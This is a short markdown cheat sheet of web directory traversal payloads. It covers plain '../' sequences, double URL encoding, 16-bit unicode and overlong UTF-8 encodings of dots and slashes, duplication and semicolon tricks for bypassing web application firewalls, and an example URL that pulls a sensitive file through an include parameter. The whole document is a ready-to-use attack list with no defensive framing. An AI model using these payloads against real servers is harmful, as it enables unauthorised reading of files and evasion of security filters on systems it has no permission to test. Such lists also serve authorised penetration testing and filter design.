# Enum-Web-Dir-Traversal

## Basic
```
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```

## Double URL encoding
```
. = %252e
/ = %252f
\ = %255c
```

## 16 Bit unicode
```
. = %u002e
/ = %u2215
\ = %u2216
```

## UTF-B
```
. = %c0%2e, %e0%40%ae, %c0ae
/ = %c0%af, %e0%80%af, %c0%2f
\ = %c0%5c, %c0%80%5c
```

## Bypass WAF with duplication
```
..././
...\.\
```

## Bypass WAF with ;
```
..;/
http://domain.tld/page.jsp?include=..;/..;/sensitive.txt 

```
